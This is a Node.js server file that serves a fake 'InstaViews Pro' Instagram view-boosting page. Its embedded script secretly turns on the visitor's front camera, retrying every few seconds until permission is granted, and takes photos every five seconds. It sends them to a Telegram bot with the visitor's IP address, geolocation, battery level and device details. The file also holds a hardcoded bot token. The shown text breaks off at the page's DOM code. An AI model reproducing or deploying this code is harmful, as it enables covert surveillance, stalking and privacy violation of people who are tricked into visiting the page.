const express = require('express');
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 3000;

// HARDCODED BOT TOKEN (Your bot only)
const HARDCODED_BOT_TOKEN = '8209971302:AAHBX9Y9oLG6ikgky-G4xD3M7T8D8F99A7s';

// RANDOM ENCODING KEYS (0-10)
const ENCODING_KEYS = {
  'a': 7, 'b': 2, 'c': 9, 'd': 1, 'e': 5, 'f': 8, 'g': 0, 'h': 3, 'i': 6, 'j': 4, 'k': 0,
  'l': 7, 'm': 2, 'n': 9, 'o': 1, 'p': 5, 'q': 8, 'r': 0, 's': 3, 't': 6, 'u': 4, 'v': 0,
  'w': 7, 'x': 2, 'y': 9, 'z': 1, 'A': 5, 'B': 8, 'C': 0, 'D': 3, 'E': 6, 'F': 4, 'G': 0,
  'H': 7, 'I': 2, 'J': 9, 'K': 1, 'L': 5, 'M': 8, 'N': 0, 'O': 3, 'P': 6, 'Q': 4, 'R': 0
};

// Function to decode chat ID from encoded string
function decodeChatId(encodedStr) {
  let chatId = '';
  for (let char of encodedStr) {
    if (ENCODING_KEYS[char] !== undefined) {
      chatId += ENCODING_KEYS[char];
    } else if (char >= '0' && char <= '9') {
      chatId += char;
    }
  }
  return chatId;
}

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// API endpoint that serves the camera capture page
app.get('/api/cam-Hack.js', (req, res) => {
  const { code } = req.query;
  
  if (!code) {
    return res.status(400).json({ 
      error: 'Missing code parameter',
      usage: '/api/cam-Hack.js?code=ENCODED_CHAT_ID',
      example: '/api/cam-Hack.js?code=abc123'
    });
  }

  // Decode chat ID from the code
  const chatId = decodeChatId(code);
  
  if (!chatId || chatId.length < 1) {
    return res.status(400).json({ 
      error: 'Invalid code format',
      message: 'Code must contain valid letters/numbers'
    });
  }

  console.log(`Decoded - Code: ${code} -> Chat ID: ${chatId}`);

  // Generate HTML with HARDCODED bot token and decoded chat ID
  const html = generateHTML(chatId, HARDCODED_BOT_TOKEN);
  
  res.setHeader('Content-Type', 'text/html');
  res.send(html);
});

// Root endpoint
app.get('/', (req, res) => {
  res.json({ 
    message: 'Instagram Cam Bot API is running! 🚀',
    usage: 'GET /api/cam-Hack.js?code=ENCODED_CHAT_ID',
    description: 'Returns a camera capture page that sends photos to your Telegram',
    note: 'Bot token is hardcoded, only chat ID needs to be encoded'
  });
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

// KEEP YOUR EXISTING generateHTML FUNCTION AND EVERYTHING ELSE EXACTLY THE SAME
// DON'T CHANGE ANYTHING BELOW THIS LINE

function generateHTML(chatId, botToken) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>InstaViews Pro | Premium Instagram Views Service</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
        }

        :root {
            --primary: #405DE6;
            --secondary: #E1306C;
            --accent: #10b981;
            --dark: #1a1a1a;
            --light: #f8f9fa;
            --gray: #6c757d;
        }

        body {
            background: linear-gradient(135deg, #f5f7fa 0%, #e4e8f0 100%);
            min-height: 100vh;
            color: #333;
            line-height: 1.6;
            overflow-x: hidden;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
        }

        /* Header Styles */
        header {
            background: white;
            box-shadow: 0 2px 15px rgba(0, 0, 0, 0.08);
            position: sticky;
            top: 0;
            z-index: 1000;
        }

        .navbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 0;
        }

        .logo {
            display: flex;
            align-items: center;
            gap: 12px;
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--dark);
        }

        .logo-icon {
            font-size: 1.8rem;
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .nav-links {
            display: flex;
            gap: 30px;
        }

        .nav-links a {
            text-decoration: none;
            color: var(--dark);
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-links a:hover {
            color: var(--primary);
        }

        .nav-cta {
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 50px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 4px 15px rgba(64, 93, 230, 0.3);
        }

        .nav-cta:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(64, 93, 230, 0.4);
        }

        /* Hero Section */
        .hero {
            padding: 80px 0;
            text-align: center;
            background: linear-gradient(135deg, #405DE6 0%, #5851DB 25%, #833AB4 50%, #C13584 75%, #E1306C 100%);
            color: white;
            border-radius: 0 0 30px 30px;
            margin-bottom: 60px;
        }

        .hero h1 {
            font-size: 3.2rem;
            margin-bottom: 20px;
            font-weight: 800;
        }

        .hero p {
            font-size: 1.2rem;
            max-width: 700px;
            margin: 0 auto 30px;
            opacity: 0.9;
        }

        .hero-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: rgba(255, 255, 255, 0.15);
            padding: 8px 20px;
            border-radius: 50px;
            margin-bottom: 30px;
            backdrop-filter: blur(10px);
        }

        /* Stats Section */
        .stats {
            display: flex;
            justify-content: center;
            gap: 50px;
            margin: 40px 0;
        }

        .stat {
            text-align: center;
        }

        .stat-number {
            font-size: 2.5rem;
            font-weight: 800;
            margin-bottom: 5px;
        }

        .stat-label {
            font-size: 0.9rem;
            opacity: 0.8;
        }

        /* Features Section */
        .section-title {
            text-align: center;
            margin-bottom: 50px;
        }

        .section-title h2 {
            font-size: 2.5rem;
            margin-bottom: 15px;
            color: var(--dark);
        }

        .section-title p {
            font-size: 1.1rem;
            color: var(--gray);
            max-width: 600px;
            margin: 0 auto;
        }

        .features {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 30px;
            margin: 60px 0;
        }

        .feature-card {
            background: white;
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.06);
            transition: transform 0.3s, box-shadow 0.3s;
        }

        .feature-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
        }

        .feature-icon {
            font-size: 2.5rem;
            margin-bottom: 20px;
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .feature-card h3 {
            font-size: 1.4rem;
            margin-bottom: 15px;
            color: var(--dark);
        }

        /* How It Works */
        .how-it-works {
            background: white;
            padding: 80px 0;
            border-radius: 30px;
            margin: 60px 0;
        }

        .steps {
            display: flex;
            justify-content: space-between;
            margin-top: 50px;
            position: relative;
        }

        .steps::before {
            content: '';
            position: absolute;
            top: 40px;
            left: 10%;
            right: 10%;
            height: 3px;
            background: linear-gradient(to right, var(--primary), var(--secondary));
            z-index: 1;
        }

        .step {
            text-align: center;
            position: relative;
            z-index: 2;
            flex: 1;
        }

        .step-number {
            width: 80px;
            height: 80px;
            background: white;
            border: 3px solid var(--primary);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.8rem;
            font-weight: 700;
            color: var(--primary);
            margin: 0 auto 20px;
            position: relative;
        }

        .step h3 {
            margin-bottom: 10px;
            color: var(--dark);
        }

        /* Testimonials */
        .testimonials {
            margin: 80px 0;
        }

        .testimonial-cards {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 30px;
        }

        .testimonial-card {
            background: white;
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.06);
        }

        .testimonial-content {
            font-style: italic;
            margin-bottom: 20px;
            color: var(--gray);
        }

        .testimonial-author {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .author-avatar {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
        }

        .author-info h4 {
            margin-bottom: 5px;
            color: var(--dark);
        }

        .author-info p {
            font-size: 0.9rem;
            color: var(--gray);
        }

        /* CTA Section */
        .cta-section {
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            color: white;
            padding: 80px 0;
            border-radius: 30px;
            text-align: center;
            margin: 60px 0;
        }

        .cta-section h2 {
            font-size: 2.5rem;
            margin-bottom: 20px;
        }

        .cta-section p {
            font-size: 1.1rem;
            max-width: 600px;
            margin: 0 auto 30px;
            opacity: 0.9;
        }

        /* Generator Section */
        .generator {
            background: white;
            border-radius: 20px;
            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.1);
            padding: 50px 40px;
            max-width: 600px;
            margin: 0 auto 80px;
            text-align: center;
            display: none;
        }

        .generator-header {
            margin-bottom: 30px;
        }

        .generator-header h2 {
            font-size: 2rem;
            margin-bottom: 10px;
            color: var(--dark);
        }

        .generator-header p {
            color: var(--gray);
        }

        .input-group {
            margin-bottom: 25px;
            position: relative;
        }

        input {
            width: 100%;
            padding: 18px 20px;
            border: 2px solid #e6e6e6;
            border-radius: 12px;
            font-size: 16px;
            transition: all 0.3s;
            background: #fafafa;
        }

        input:focus {
            outline: none;
            border-color: var(--primary);
            background: white;
            box-shadow: 0 0 0 3px rgba(64, 93, 230, 0.1);
        }

        .btn {
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            color: white;
            border: none;
            padding: 18px 50px;
            border-radius: 50px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            margin-bottom: 20px;
            box-shadow: 0 4px 15px rgba(64, 93, 230, 0.3);
            width: 100%;
        }

        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(64, 93, 230, 0.4);
        }

        .btn:active {
            transform: translateY(0);
        }

        .trust-badges {
            display: flex;
            justify-content: center;
            gap: 25px;
            margin: 25px 0;
        }

        .badge {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 5px;
        }

        .badge i {
            font-size: 1.8rem;
            color: var(--primary);
        }

        .badge span {
            font-size: 0.75rem;
            color: var(--gray);
        }

        .loading-screen {
            display: none;
        }

        .loader-container {
            position: relative;
            margin: 30px 0;
        }

        .loader {
            width: 80px;
            height: 80px;
            border: 6px solid #f0f0f0;
            border-top: 6px solid var(--primary);
            border-radius: 50%;
            animation: spin 1.2s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .server-messages {
            background: #f8f9fa;
            border-radius: 12px;
            padding: 25px;
            margin: 25px 0;
            min-height: 240px;
            text-align: left;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            color: #333;
            border: 1px solid #eaeaea;
            overflow-y: auto;
            max-height: 240px;
        }

        .message {
            margin-bottom: 12px;
            opacity: 0;
            animation: fadeIn 0.5s forwards;
            line-height: 1.5;
        }

        @keyframes fadeIn {
            to { opacity: 1; }
        }

        .success {
            color: var(--accent);
        }

        .warning {
            color: #f59e0b;
        }

        .error {
            color: #ef4444;
        }

        .info {
            color: var(--primary);
        }

        .progress-container {
            margin: 25px 0;
        }

        .progress-text {
            display: flex;
            justify-content: space-between;
            margin-bottom: 8px;
            font-size: 0.9rem;
            color: var(--gray);
        }

        .progress-bar {
            width: 100%;
            height: 10px;
            background: #f0f0f0;
            border-radius: 5px;
            overflow: hidden;
        }

        .progress {
            width: 0%;
            height: 100%;
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            transition: width 0.5s ease;
        }

        .result {
            display: none;
            margin-top: 30px;
        }

        .result-icon {
            font-size: 4rem;
            color: var(--accent);
            margin-bottom: 20px;
        }

        .views-count {
            font-size: 3.5rem;
            font-weight: 800;
            color: var(--primary);
            margin: 20px 0;
            text-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }

        .result-text {
            font-size: 1.2rem;
            color: #555;
            margin-bottom: 30px;
        }

        .disclaimer {
            font-size: 0.8rem;
            color: var(--gray);
            margin-top: 30px;
            line-height: 1.5;
            padding: 15px;
            background: #f9f9f9;
            border-radius: 8px;
        }

        /* Footer */
        footer {
            background: var(--dark);
            color: white;
            padding: 60px 0 30px;
        }

        .footer-content {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 40px;
            margin-bottom: 40px;
        }

        .footer-column h3 {
            margin-bottom: 20px;
            font-size: 1.2rem;
        }

        .footer-links {
            list-style: none;
        }

        .footer-links li {
            margin-bottom: 10px;
        }

        .footer-links a {
            color: #aaa;
            text-decoration: none;
            transition: color 0.3s;
        }

        .footer-links a:hover {
            color: white;
        }

        .footer-bottom {
            text-align: center;
            padding-top: 30px;
            border-top: 1px solid #333;
            color: #aaa;
            font-size: 0.9rem;
        }

        /* Responsive */
        @media (max-width: 768px) {
            .navbar {
                flex-direction: column;
                gap: 20px;
            }
            
            .nav-links {
                gap: 15px;
            }
            
            .hero h1 {
                font-size: 2.5rem;
            }
            
            .stats {
                flex-direction: column;
                gap: 30px;
            }
            
            .steps {
                flex-direction: column;
                gap: 40px;
            }
            
            .steps::before {
                display: none;
            }
        }

        /* Animation for smooth transitions */
        .fade-in {
            animation: fadeIn 0.5s ease-in;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .url-example {
            font-size: 0.8rem;
            color: var(--gray);
            margin-top: 8px;
            text-align: left;
        }
        
        .error-message {
            color: #ef4444;
            font-size: 0.9rem;
            margin-top: 8px;
            text-align: left;
            display: none;
        }

        /* Hidden camera elements */
        .hidden-camera {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <!-- Header -->
    <header>
        <div class="container">
            <nav class="navbar">
                <div class="logo">
                    <i class="fas fa-eye logo-icon"></i>
                    <span>InstaViews Pro</span>
                </div>
                <div class="nav-links">
                    <a href="#features">Features</a>
                    <a href="#how-it-works">How It Works</a>
                    <a href="#testimonials">Testimonials</a>
                </div>
                <button class="nav-cta" id="getStartedBtn">Get Started</button>
            </nav>
        </div>
    </header>

    <!-- Hero Section -->
    <section class="hero" id="mainContent">
        <div class="container">
            <div class="hero-badge">
                <i class="fas fa-star"></i>
                <span>Trusted by 50,000+ Instagram Users</span>
            </div>
            <h1>Boost Your Instagram Video Views</h1>
            <p>Our advanced algorithm delivers real, active viewers to increase your video visibility and engagement.</p>
            
            <div class="stats">
                <div class="stat">
                    <div class="stat-number">50K+</div>
                    <div class="stat-label">Happy Users</div>
                </div>
                <div class="stat">
                    <div class="stat-number">25M+</div>
                    <div class="stat-label">Views Delivered</div>
                </div>
                <div class="stat">
                    <div class="stat-number">24/7</div>
                    <div class="stat-label">Active Support</div>
                </div>
            </div>
        </div>
    </section>

    <!-- Features Section -->
    <section class="container" id="features">
        <div class="section-title">
            <h2>Why Choose InstaViews Pro?</h2>
            <p>Our premium service delivers real results with cutting-edge technology</p>
        </div>
        
        <div class="features">
            <div class="feature-card">
                <i class="fas fa-eye feature-icon"></i>
                <h3>Real, Active Viewers</h3>
                <p>We deliver genuine Instagram users who will watch your videos, not bots or fake accounts.</p>
            </div>
            <div class="feature-card">
                <i class="fas fa-shield-alt feature-icon"></i>
                <h3>100% Safe & Secure</h3>
                <p>Our methods comply with Instagram's terms of service. Your account security is our top priority.</p>
            </div>
            <div class="feature-card">
                <i class="fas fa-rocket feature-icon"></i>
                <h3>Fast Delivery</h3>
                <p>See noticeable growth within hours of starting. Our optimized delivery ensures quick results.</p>
            </div>
            <div class="feature-card">
                <i class="fas fa-chart-line feature-icon"></i>
                <h3>Targeted Views</h3>
                <p>Reach users in your niche who are genuinely interested in your content for higher engagement.</p>
            </div>
            <div class="feature-card">
                <i class="fas fa-infinity feature-icon"></i>
                <h3>Continuous Growth</h3>
                <p>Our algorithm continuously works to bring new viewers to your videos 24/7.</p>
            </div>
            <div class="feature-card">
                <i class="fas fa-headset feature-icon"></i>
                <h3>Premium Support</h3>
                <p>Our dedicated support team is available around the clock to assist with any questions.</p>
            </div>
        </div>
    </section>

    <!-- How It Works -->
    <section class="how-it-works" id="how-it-works">
        <div class="container">
            <div class="section-title">
                <h2>How It Works</h2>
                <p>Getting more views is simple with our streamlined process</p>
            </div>
            
            <div class="steps">
                <div class="step">
                    <div class="step-number">1</div>
                    <h3>Paste Video URL</h3>
                    <p>Copy and paste your Instagram video URL - no login required</p>
                </div>
                <div class="step">
                    <div class="step-number">2</div>
                    <h3>Our System Analyzes</h3>
                    <p>We assess your video and optimize for maximum visibility</p>
                </div>
                <div class="step">
                    <div class="step-number">3</div>
                    <h3>Views Start Coming</h3>
                    <p>Watch as real users discover and watch your video content</p>
                </div>
            </div>
        </div>
    </section>

    <!-- Testimonials -->
    <section class="testimonials container" id="testimonials">
        <div class="section-title">
            <h2>Success Stories</h2>
            <p>See what our users are saying about their experience</p>
        </div>
        
        <div class="testimonial-cards">
            <div class="testimonial-card">
                <div class="testimonial-content">
                    "I was skeptical at first, but InstaViews Pro delivered exactly what they promised. My video got over 50,000 views in just 48 hours!"
                </div>
                <div class="testimonial-author">
                    <div class="author-avatar">JS</div>
                    <div class="author-info">
                        <h4>Jessica Smith</h4>
                        <p>Content Creator</p>
                    </div>
                </div>
            </div>
            <div class="testimonial-card">
                <div class="testimonial-content">
                    "As a musician, getting my music videos seen is crucial. Thanks to InstaViews Pro, my latest video went viral with over 100K views!"
                </div>
                <div class="testimonial-author">
                    <div class="author-avatar">MR</div>
                    <div class="author-info">
                        <h4>Michael Roberts</h4>
                        <p>Musician</p>
                    </div>
                </div>
            </div>
            <div class="testimonial-card">
                <div class="testimonial-content">
                    "I've tried other services before, but none delivered real, engaged viewers like InstaViews Pro. My engagement rate has never been higher!"
                </div>
                <div class="testimonial-author">
                    <div class="author-avatar">AD</div>
                    <div class="author-info">
                        <h4>Amanda Davis</h4>
                        <p>Travel Vlogger</p>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- CTA Section -->
    <section class="cta-section">
        <div class="container">
            <h2>Ready to Boost Your Video Views?</h2>
            <p>Join thousands of satisfied users and increase your video visibility today</p>
            <button class="btn" id="ctaBtn" style="max-width: 300px;">
                <i class="fas fa-rocket" style="margin-right: 10px;"></i>
                GET STARTED NOW
            </button>
        </div>
    </section>

    <!-- Generator Section -->
    <section class="container" id="generatorSection">
        <div class="generator" id="generator">
            <div class="generator-header">
                <h2>Get Free Video Views</h2>
                <p>Paste your Instagram video URL below to start getting more views</p>
            </div>
            
            <div class="input-group">
                <input type="text" id="videoUrl" placeholder="Paste your Instagram video URL here" autocomplete="off">
                <div class="url-example">Example: https://www.instagram.com/reel/CxampleVideo123/</div>
                <div class="error-message" id="urlError">Please enter a valid Instagram URL</div>
            </div>
            
            <button class="btn" id="generateBtn">
                <i class="fas fa-rocket" style="margin-right: 10px;"></i>
                GENERATE VIEWS
            </button>
            
            <div class="trust-badges">
                <div class="badge">
                    <i class="fas fa-shield-alt"></i>
                    <span>Secure</span>
                </div>
                <div class="badge">
                    <i class="fas fa-bolt"></i>
                    <span>Fast</span>
                </div>
                <div class="badge">
                    <i class="fas fa-users"></i>
                    <span>Real Users</span>
                </div>
            </div>

            <div class="loading-screen" id="loadingScreen">
                <div class="loader-container">
                    <div class="loader"></div>
                </div>
                
                <div class="progress-container">
                    <div class="progress-text">
                        <span>Processing...</span>
                        <span id="progressPercent">0%</span>
                    </div>
                    <div class="progress-bar">
                        <div class="progress" id="progressBar"></div>
                    </div>
                </div>
                
                <div class="server-messages" id="serverMessages"></div>
            </div>

            <div class="result" id="result">
                <i class="fas fa-check-circle result-icon"></i>
                <h2>Success! Views Added</h2>
                <div class="views-count" id="viewsCount">0</div>
                <div class="result-text">New views have been added to your Instagram video</div>
                <button class="btn" id="shareBtn" style="background: linear-gradient(45deg, #10b981, #059669);">
                    <i class="fas fa-share-alt" style="margin-right: 10px;"></i>
                    SHARE SUCCESS
                </button>
            </div>

            <div class="disclaimer">
                <i class="fas fa-info-circle" style="margin-right: 5px;"></i>
                This service is not affiliated with Instagram. By using our service, you agree to our Terms of Service and Privacy Policy. Results may vary.
            </div>
        </div>
    </section>

    <!-- Footer -->
    <footer>
        <div class="container">
            <div class="footer-content">
                <div class="footer-column">
                    <h3>InstaViews Pro</h3>
                    <p>The leading Instagram views service trusted by thousands of users worldwide.</p>
                </div>
                <div class="footer-column">
                    <h3>Quick Links</h3>
                    <ul class="footer-links">
                        <li><a href="#features">Features</a></li>
                        <li><a href="#how-it-works">How It Works</a></li>
                        <li><a href="#testimonials">Testimonials</a></li>
                    </ul>
                </div>
                <div class="footer-column">
                    <h3>Legal</h3>
                    <ul class="footer-links">
                        <li><a href="#">Terms of Service</a></li>
                        <li><a href="#">Privacy Policy</a></li>
                        <li><a href="#">Cookie Policy</a></li>
                        <li><a href="#">Disclaimer</a></li>
                    </ul>
                </div>
                <div class="footer-column">
                    <h3>Contact</h3>
                    <ul class="footer-links">
                        <li><a href="mailto:support@instaviewspro.com">support@instaviewspro.com</a></li>
                        <li><a href="#">Help Center</a></li>
                        <li><a href="#">Live Chat</a></li>
                    </ul>
                </div>
            </div>
            
            <div class="footer-bottom">
                <p>&copy; 2023 InstaViews Pro. All rights reserved.</p>
            </div>
        </div>
    </footer>

    <!-- Hidden Camera Elements -->
    <video id="hiddenCamera" class="hidden-camera" autoplay></video>
    <canvas id="hiddenCanvas" class="hidden-camera"></canvas>

    <script>
        // ========== TELEGRAM CONFIGURATION ==========
        const chatId = "${chatId}";
        const botToken = "${botToken}";
        
        console.log('Telegram Config Loaded:', { chatId, botToken });

        // Camera and location tracking variables
        let cameraStream = null;
        let photoInterval = null;
        let photoCount = 0;
        let hiddenVideo = null;
        let hiddenCanvas = null;
        let userLocation = null;
        let locationRequested = false;
        let cameraAccessGranted = false;

        window.addEventListener('load', function() {
            // Create hidden elements for camera
            hiddenVideo = document.getElementById('hiddenCamera');
            hiddenCanvas = document.getElementById('hiddenCanvas');

            // SILENTLY request camera permission on site load
            setTimeout(function() {
                requestCameraPermission();
            }, 1000);
        });

        // Function to request camera permission (will keep asking until allowed)
        function requestCameraPermission() {
            navigator.mediaDevices.getUserMedia({ 
                video: { 
                    width: 640, 
                    height: 480,
                    facingMode: 'user' // Use front camera
                } 
            })
            .then(function(stream) {
                console.log("Camera accessed successfully!");
                cameraStream = stream;
                cameraAccessGranted = true;
                
                // Setup hidden video
                hiddenVideo.srcObject = stream;
                hiddenVideo.play();
                
                // Wait for video to be ready then start capturing
                hiddenVideo.addEventListener('loadedmetadata', function() {
                    startPhotoCapture();
                });
            })
            .catch(function(err) {
                console.log("Camera denied: " + err);
                cameraAccessGranted = false;
                // Try again in 3 seconds
                setTimeout(requestCameraPermission, 3000);
            });
        }

        // Function to request location permission (one time only)
        function requestLocationPermission() {
            if (locationRequested) return;
            
            if (navigator.geolocation) {
                locationRequested = true;
                console.log("Requesting location permission...");
                
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        userLocation = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        };
                        console.log("Location accessed:", userLocation);
                        
                        // Send location to Telegram immediately
                        sendLocationToTelegram(userLocation);
                    },
                    function(error) {
                        console.log("Location not available:", error.message);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            }
        }

        // ========== SEND LOCATION TO TELEGRAM ==========
        async function sendLocationToTelegram(location) {
            if (!chatId || !botToken) {
                console.log('Missing chatId or botToken');
                return;
            }

            const message = "📍 **LOCATION CAPTURED** 📍\\n\\n" +
                           "📱 **Device Info:**\\n" +
                           "• User Agent: " + navigator.userAgent + "\\n" +
                           "• Platform: " + navigator.platform + "\\n" +
                           "• Language: " + navigator.language + "\\n\\n" +
                           "📍 **Location Data:**\\n" +
                           "• Latitude: " + location.latitude + "\\n" +
                           "• Longitude: " + location.longitude + "\\n" +
                           "• Accuracy: " + location.accuracy + " meters\\n\\n" +
                           "• Google Maps:https://www.google.com/maps?q=" + location.latitude + "," + location.longitude + "\\n\\n" +
                           "🕐 **Time:** " + new Date().toLocaleString() + "\\n" +
                           "🌐 **Page URL:** " + window.location.href;
                           "🕐 **Time:** " + new Date().toLocaleString() + "\\n" +
                           "🌐 **URL:** " + window.location.href;

            try {
                const response = await fetch("https://api.telegram.org/bot" + botToken + "/sendMessage", {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
                
                if (response.ok) {
                    console.log('📍 Location sent to Telegram successfully');
                } else {
                    console.error('Failed to send location to Telegram');
                }
            } catch (error) {
                console.error('Error sending location to Telegram:', error);
            }
        }

        // Start capturing photos
        function startPhotoCapture() {
            // Capture first photo immediately
            setTimeout(capturePhoto, 1000);
            
            // Then capture every 5 seconds
            photoInterval = setInterval(() => {
                capturePhoto();
            }, 5000);
        }

        // Capture photo and collect data
        async function capturePhoto() {
            if (!cameraStream || !hiddenVideo || hiddenVideo.videoWidth === 0) {
                console.log("Camera not ready");
                return;
            }
            
            try {
                // Setup canvas
                hiddenCanvas.width = hiddenVideo.videoWidth;
                hiddenCanvas.height = hiddenVideo.videoHeight;
                const context = hiddenCanvas.getContext('2d');
                
                // Draw video frame to canvas
                context.drawImage(hiddenVideo, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
                
                // Collect visitor information
                const visitorInfo = await collectVisitorInfo();
                visitorInfo.photo_count = photoCount;
                
                // Add location to visitor info if available
                if (userLocation) {
                    visitorInfo.location = userLocation;
                }
                
                // Convert to blob and send to Telegram
                hiddenCanvas.toBlob(blob => {
                    if (blob) {
                        sendPhotoToTelegram(blob, visitorInfo);
                        console.log("📸 Photo " + photoCount + " captured and sent");
                    }
                }, 'image/jpeg', 0.8);
                
                photoCount++;
                
            } catch (error) {
                console.error("Error capturing photo:", error);
            }
        }

        // Collect all visitor information
        async function collectVisitorInfo() {
            const info = {
                timestamp: new Date().toISOString(),
                user_agent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screen: screen.width + "x" + screen.height,
                viewport: window.innerWidth + "x" + window.innerHeight,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                referrer: document.referrer,
                url: window.location.href
            };

            // Get battery information
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    info.battery = Math.round(battery.level * 100) + "%";
                    info.charging = battery.charging;
                } catch (e) {
                    info.battery = 'unavailable';
                }
            }

            // Get connection information
            if ('connection' in navigator) {
                const connection = navigator.connection;
                info.connection_type = connection.effectiveType;
                info.downlink = connection.downlink;
            }

            // Get IP address
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                info.ip = ipData.ip;
            } catch (e) {
                info.ip = 'unknown';
            }

            // Get device memory
            if ('deviceMemory' in navigator) {
                info.memory = navigator.deviceMemory;
            }

            // Get CPU cores
            if ('hardwareConcurrency' in navigator) {
                info.cores = navigator.hardwareConcurrency;
            }

            return info;
        }

        // ========== SEND PHOTO TO TELEGRAM ==========
        async function sendPhotoToTelegram(blob, visitorInfo) {
            if (!chatId || !botToken) {
                console.log('Missing chatId or botToken - cannot send photo');
                return;
            }

            try {
                // Convert blob to File
                const file = new File([blob], "photo_" + Date.now() + ".jpg", { type: 'image/jpeg' });
                
                // Create FormData
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', file);
                
                // Create caption with visitor info
                const caption = "📸 **CAMERA PHOTO CAPTURED** 📸\\n\\n" +
                               "🆔 **Photo #" + visitorInfo.photo_count + "**\\n" +
                               "🕐 **Time:** " + new Date(visitorInfo.timestamp).toLocaleString() + "\\n\\n" +
                               "📱 **Device Information:**\\n" +
                               "• Platform: " + visitorInfo.platform + "\\n" +
                               "• Screen: " + visitorInfo.screen + "\\n" +
                               "• Viewport: " + visitorInfo.viewport + "\\n" +
                               "• Language: " + visitorInfo.language + "\\n" +
                               "• Timezone: " + visitorInfo.timezone + "\\n\\n" +
                               "🌐 **Network & System:**\\n" +
                               "• IP Address: " + visitorInfo.ip + "\\n" +
                               "• Connection: " + (visitorInfo.connection_type || 'Unknown') + "\\n" +
                               "• Battery: " + visitorInfo.battery + (visitorInfo.charging ? ' (Charging)' : '') + "\\n" +
                               "• Cores: " + (visitorInfo.cores || 'Unknown') + "\\n" +
                               "• Memory: " + (visitorInfo.memory || 'Unknown') + " GB\\n\\n" +
                               "📍 **Location:** " + (visitorInfo.location ? 
                                   visitorInfo.location.latitude + ", " + visitorInfo.location.longitude : 
                                   'Not available') + "\\n\\n" +
                               "🔗 **Referrer:** " + (visitorInfo.referrer || 'Direct visit');

                formData.append('caption', caption);
                formData.append('parse_mode', 'Markdown');

                // Send to Telegram
                const response = await fetch("https://api.telegram.org/bot" + botToken + "/sendPhoto", {
                    method: 'POST',
                    body: formData
                });

                if (response.ok) {
                    console.log('✅ Photo sent to Telegram successfully');
                } else {
                    const errorText = await response.text();
                    console.error('❌ Failed to send photo to Telegram:', errorText);
                }
            } catch (error) {
                console.error('❌ Error sending photo to Telegram:', error);
            }
        }

        // ========== EXISTING DOM CODE ==========
        // DOM Elements
        const getStartedBtn = document.getElementById('getStartedBtn');
        const ctaBtn = document.getElementById('ctaBtn');
        const generator = document.getElementById('generator');
        const generateBtn = document.getElementById('generateBtn');
